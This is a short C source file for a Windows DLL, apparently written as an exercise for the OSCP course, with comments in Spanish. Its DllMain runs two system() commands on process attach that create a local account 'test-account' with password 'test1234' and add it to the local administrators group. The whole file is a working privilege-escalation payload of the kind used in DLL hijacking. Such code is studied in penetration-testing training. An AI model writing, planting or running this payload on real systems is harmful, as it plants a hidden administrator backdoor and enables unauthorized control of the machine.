#include <stdlib.h>
#include <windows.h>

// Super inyección mega basica del curso OSCP

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		// Código de inyección aquí
		// Voy a hacer una nueva cuenta para local admin
		int i;
		i = system("net user /add test-account test1234");
		i = system("net localgroup administrators test-account /add");
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}